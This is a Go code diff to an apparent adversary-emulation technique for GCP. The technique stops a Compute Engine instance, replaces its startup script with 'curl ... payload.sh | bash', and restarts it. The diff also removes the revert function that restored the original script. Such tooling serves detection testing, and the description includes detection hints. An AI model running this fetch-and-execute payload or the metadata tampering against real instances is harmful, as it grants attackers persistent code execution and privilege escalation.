@@ -17,8 +17,7 @@ import (
 var tf []byte
 
 const (
-	legitimateStartupScript = "#!/bin/bash\necho 'Legitimate startup script'"
-	maliciousStartupScript  = "#!/bin/bash\ncurl -s https://stratus-red-team.cloud/payload.sh | bash"
+	maliciousStartupScript = "#!/bin/bash\ncurl -s https://stratus-red-team.cloud/payload.sh | bash"
 )
 
 func init() {
@@ -26,11 +25,10 @@ func init() {
 		ID:           "gcp.execution.modify-gce-startup-script",
 		FriendlyName: "Modify a GCE Instance Startup Script",
 		Description: `
-Modifies the startup script of a stopped GCE instance to execute an attacker-controlled
-payload on the next boot. An attacker with <code>compute.instances.setMetadata</code>
-permission can use this technique to achieve persistent code execution and privilege
-escalation through the instance's service account, without needing direct access to
-the instance.
+Stops a GCE instance, modifies its startup script to execute an attacker-controlled payload on the
+next boot, and restarts it. An attacker with <code>compute.instances.setMetadata</code> permission
+can use this technique to achieve persistent code execution and privilege escalation through the
+instance's service account, without needing direct access to the instance.
 
 Warm-up:
 
@@ -41,12 +39,6 @@ Detonation:
 - Stop the GCE instance and wait for it to reach <code>TERMINATED</code> state
 - Replace the <code>startup-script</code> metadata value with a command that fetches
   and executes a remote payload
-- Restart the instance
-
-Revert:
-
-- Stop the instance
-- Restore the original <code>startup-script</code> metadata value
 - Restart the instance
 
 References:
@@ -64,12 +56,11 @@ that points to an external URL or contains suspicious commands. Correlate with
 preceding <code>v1.compute.instances.stop</code> events on the same instance.
 `,
 		Platform:                   stratus.GCP,
-		IsIdempotent:               true,
+		IsIdempotent:               false,
 		IsSlow:                     true,
 		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Execution, mitreattack.PrivilegeEscalation},
 		PrerequisitesTerraformCode: tf,
 		Detonate:                   detonate,
-		Revert:                     revert,
 	})
 }
 
@@ -109,13 +100,21 @@ func waitForInstanceStatus(
 	return fmt.Errorf("instance %s did not reach status %s after %d attempts", instanceName, desiredStatus, maxAttempts)
 }
 
-// setStartupScript stops the instance, replaces its startup-script metadata,
-// then starts it again.
-func setStartupScript(
-	ctx context.Context,
-	client *compute.InstancesClient,
-	projectId, zone, instanceName, script string,
-) error {
+func detonate(params map[string]string, providers stratus.CloudProviders) error {
+	gcp := providers.GCP()
+	projectId := gcp.GetProjectId()
+	instanceName := params["instance_name"]
+	zone := params["zone"]
+	ctx := context.Background()
+
+	client, err := newInstancesClient(ctx, providers)
+	if err != nil {
+		return err
+	}
+	defer client.Close()
+
+	log.Printf("Replacing startup script on GCE instance %s with a remote payload fetcher\n", instanceName)
+
 	log.Printf("Stopping instance %s\n", instanceName)
 	stopOp, err := client.Stop(ctx, &computepb.StopInstanceRequest{
 		Project:  projectId,
@@ -157,7 +156,7 @@ func setStartupScript(
 			Items: []*computepb.Items{
 				{
 					Key:   ptr("startup-script"),
-					Value: ptr(script),
+					Value: ptr(maliciousStartupScript),
 				},
 			},
 		},
@@ -184,50 +183,7 @@ func setStartupScript(
 		return fmt.Errorf("failed waiting for instance %s to start: %w", instanceName, err)
 	}
 
-	return nil
-}
-
-func detonate(params map[string]string, providers stratus.CloudProviders) error {
-	gcp := providers.GCP()
-	projectId := gcp.GetProjectId()
-	instanceName := params["instance_name"]
-	zone := params["zone"]
-	ctx := context.Background()
-
-	client, err := newInstancesClient(ctx, providers)
-	if err != nil {
-		return err
-	}
-	defer client.Close()
-
-	log.Printf("Replacing startup script on GCE instance %s with a remote payload fetcher\n", instanceName)
-	if err = setStartupScript(ctx, client, projectId, zone, instanceName, maliciousStartupScript); err != nil {
-		return err
-	}
-
 	log.Printf("Successfully replaced startup script on instance %s — malicious payload will execute on next boot\n", instanceName)
-	return nil
-}
-
-func revert(params map[string]string, providers stratus.CloudProviders) error {
-	gcp := providers.GCP()
-	projectId := gcp.GetProjectId()
-	instanceName := params["instance_name"]
-	zone := params["zone"]
-	ctx := context.Background()
-
-	client, err := newInstancesClient(ctx, providers)
-	if err != nil {
-		return err
-	}
-	defer client.Close()
-
-	log.Printf("Restoring original startup script on GCE instance %s\n", instanceName)
-	if err = setStartupScript(ctx, client, projectId, zone, instanceName, legitimateStartupScript); err != nil {
-		return err
-	}
-
-	log.Printf("Successfully restored original startup script on instance %s\n", instanceName)
 	return nil
 }
 
